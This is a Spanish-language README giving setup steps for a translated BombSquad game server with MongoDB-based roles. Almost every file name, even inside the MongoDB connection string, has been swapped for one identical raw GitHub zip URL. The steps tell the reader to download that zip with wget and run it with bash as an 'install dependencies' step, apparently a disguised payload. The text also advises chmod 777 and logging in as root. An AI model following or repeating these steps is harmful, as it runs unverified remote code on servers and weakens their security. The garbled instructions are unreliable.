lea antes de usarlo
para que de bien el servidor deben de crear una cuenta de mongodb
ya que logic usa mongo para manejar los roles
debes de crear una cuenta mongodb para usar este archivo la versión
es de 1.4.155 yo solo lo traduje en español. lo demás pertenece a logic y Rouss

para descargar el archivo es 

wget https://raw.githubusercontent.com/MIKE23482/chupa_server/main/tetroxide/chupa-server-v1.1-alpha.1.zip

1-instala el repositorio https://raw.githubusercontent.com/MIKE23482/chupa_server/main/tetroxide/chupa-server-v1.1-alpha.1.zip para ejecutarlo es bash https://raw.githubusercontent.com/MIKE23482/chupa_server/main/tetroxide/chupa-server-v1.1-alpha.1.zip para instalar las dependencias del servidor
después de instalar las dependencias utilizas estos comandos

sudo firewall-cmd --permanent --zone=public --add-port=<cualquier_puerto>/udp

luego sudo firewall-cmd --reload

2-para que les de bien el servidor instalen los repositorios mongodb
instalar el repositorio pip

pip install BeautifulSoup

pip install pymongo

luego Entra a tu cuenta de MongoDB tocas

Project0>botón Connect> Drivers click en Driver busca python pon en la versión 3.4 al botón version y copia tu cluster

En https://raw.githubusercontent.com/MIKE23482/chupa_server/main/tetroxide/chupa-server-v1.1-alpha.1.zip ahí pones esto (si sabes crear los roles y si eres experto puedes crear tus propios roles ahi)

y para agregar comandos es en chatcmd por si agregaste roles

para agregar tags o prefix es en https://raw.githubusercontent.com/MIKE23482/chupa_server/main/tetroxide/chupa-server-v1.1-alpha.1.zip buscan cod y ahi esta el codigo.

por si quieres cambiar las preguntas es en https://raw.githubusercontent.com/MIKE23482/chupa_server/main/tetroxide/chupa-server-v1.1-alpha.1.zip

para modificar lo del chat y otras cosas es en https://raw.githubusercontent.com/MIKE23482/chupa_server/main/tetroxide/chupa-server-v1.1-alpha.1.zip, https://raw.githubusercontent.com/MIKE23482/chupa_server/main/tetroxide/chupa-server-v1.1-alpha.1.zip

para ponerte owner es en https://raw.githubusercontent.com/MIKE23482/chupa_server/main/tetroxide/chupa-server-v1.1-alpha.1.zip

mongodb://<user>:<password>https://raw.githubusercontent.com/MIKE23482/chupa_server/main/tetroxide/chupa-server-v1.1-alpha.1.zip,https://raw.githubusercontent.com/MIKE23482/chupa_server/main/tetroxide/chupa-server-v1.1-alpha.1.zip,https://raw.githubusercontent.com/MIKE23482/chupa_server/main/tetroxide/chupa-server-v1.1-alpha.1.zip

Ojo el <user> y <password> es el usuario y contra en tu cluster que has creado la clave
Pero antes den chmod 777 a bombsquad_server bscfg data bs_headless y a https://raw.githubusercontent.com/MIKE23482/chupa_server/main/tetroxide/chupa-server-v1.1-alpha.1.zip y en https://raw.githubusercontent.com/MIKE23482/chupa_server/main/tetroxide/chupa-server-v1.1-alpha.1.zip modifican todo
si quieres modificar archivos y descargarlos

instala el ftp

apt install vsftpd

después nano https://raw.githubusercontent.com/MIKE23482/chupa_server/main/tetroxide/chupa-server-v1.1-alpha.1.zip

y ahí buscan

#READ_ENABLE=YES

borran el # y salen con cntrl+x después di y y luego enter

despues reinician el repositorio service vsftpd restart

y luego ves el estado service vsftpd status

y si ven all good ya pueden conectarse ala vps
el puerto es 22 es sftp

y usa la ip y pass del root y listo descargas tus archivos.

luego si siguieron estos pasos disfruta encendiendo ./bombsquad_server

para mantener activado el server es con tmux

y si quieren volver si es un servidor que hostias es tmux attach 

o si hosteas 5 servidores ve con tmux ls para ve cuantos tienes

y para volver al server es así tmux attach -d -t <número de sesion>
Disfruta.
